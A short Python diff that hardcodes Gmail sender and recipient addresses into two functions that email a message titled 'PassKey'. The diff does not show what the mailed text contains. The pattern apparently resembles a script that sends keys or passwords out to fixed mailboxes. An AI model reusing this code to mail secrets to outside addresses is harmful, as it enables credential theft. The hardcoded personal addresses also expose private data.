@@ -48,6 +48,8 @@ def SendEmail(text):
 
 def SendSecondEmail(text):
 # Create message
+    sender="pltnmsmith@gmail.com"
+    recipient="pltnmsmith@gmail.com"
     msg = MIMEMultipart("alternative")
     msg['Subject'] = f"PassKey"
     msg['From'] = sender
@@ -64,6 +66,8 @@ def SendSecondEmail(text):
 
 def SendThirdEmail(text):
 # Create message
+    sender="swingfocus58@gmail.com"
+    recipient="swingfocus58@gmail.com"
     msg = MIMEMultipart("alternative")
     msg['Subject'] = f"PassKey"
     msg['From'] = sender
